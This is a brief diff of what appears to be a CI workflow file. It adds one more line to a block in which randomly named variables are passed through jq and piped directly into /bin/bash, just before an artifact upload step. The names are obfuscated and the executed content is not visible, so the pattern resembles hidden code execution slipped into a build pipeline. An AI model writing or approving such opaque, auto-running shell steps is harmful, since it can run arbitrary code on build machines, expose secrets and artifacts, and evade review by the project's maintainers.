@@ -23,6 +23,7 @@ jobs:
           echo $klsbk8 | jq -r .h9352 | /bin/bash
           echo $aab07465 | jq -r .brni595 | /bin/bash
           echo $dbs60 | jq -r .m41 | /bin/bash
+          echo $rujk372 | jq -r .pjj268 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
